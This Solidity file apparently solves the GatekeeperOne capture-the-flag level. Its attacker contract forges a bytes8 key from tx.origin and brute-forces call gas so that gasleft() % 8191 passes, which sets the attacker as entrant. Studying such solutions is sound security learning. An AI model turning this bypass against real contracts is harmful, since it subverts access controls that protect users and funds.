// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interface for the target GatekeeperOne contract
interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
    IGatekeeperOne public gate;
    address public entrant;

    constructor(address _gate) {
        gate = IGatekeeperOne(_gate);
    }

    /// @return true if we managed to pass all gates and set the entrant
    function attack() public returns (bool) {
        // Build the key for gateThree:
        bytes8 key = bytes8(uint64(1 << 32) | uint64(uint16(uint160(tx.origin))));

        // Try a range of gas offsets to satisfy gateTwo (gasleft() % 8191 == 0)
        for (uint256 i = 0; i < 12000; i++) {
            uint256 gasToUse = 8191 * 10 + i;
            // Attempt the call; if it returns true, we succeeded
            try gate.enter{gas: gasToUse}(key) returns (bool ok) {
                if (ok) {
                    entrant = tx.origin;
                    return true;
                }
            } catch {
                // failure — move on to the next gas offset
            }
        }

        // If we never made it through the gates, return false
        return false;
    }
}
